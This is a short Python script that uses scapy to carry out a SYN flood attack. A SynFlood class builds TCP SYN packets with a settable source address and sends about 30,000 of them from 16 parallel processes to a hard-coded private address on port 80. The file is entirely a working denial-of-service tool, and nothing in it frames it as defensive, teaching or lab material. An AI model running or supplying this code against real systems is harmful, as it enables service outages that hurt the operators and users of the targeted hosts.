from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send
from multiprocessing import Pool, Process
from math import ceil
import os


class SynFlood:
    def __init__(self, target_ip, target_port, source_ip, source_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_ip = source_ip
        self.source_port = source_port


    def send_syn_packet(self):
        # Set the IP header
        ip_header = IP(src=self.source_ip, dst=self.target_ip)

        # Set the TCP header
        tcp_header = TCP(sport=self.source_port, dport=self.target_port, flags="S")

        # Send the SYN packet
        packet = ip_header / tcp_header
        send(packet)

    def attack(self, number_packets):
        print(f"Process id : {os.getpid()}")
        for _ in range(number_packets):
            self.send_syn_packet()

    def parallel_attack(self, num_processes, min_number_packets=30000):
        print(f"Attacking {self.target_ip} on port {self.target_port} with {num_processes} processes")
        packets_per_process = ceil(min_number_packets / num_processes)
        processes = []
        for _ in range(num_processes):
            process = Process(target=self.attack, args=(packets_per_process,))
            process.start()
            processes.append(process)

if __name__ == '__main__':
    SynFlood("192.168.1.10", 80, "0.0.0.0", 12345).parallel_attack(16)
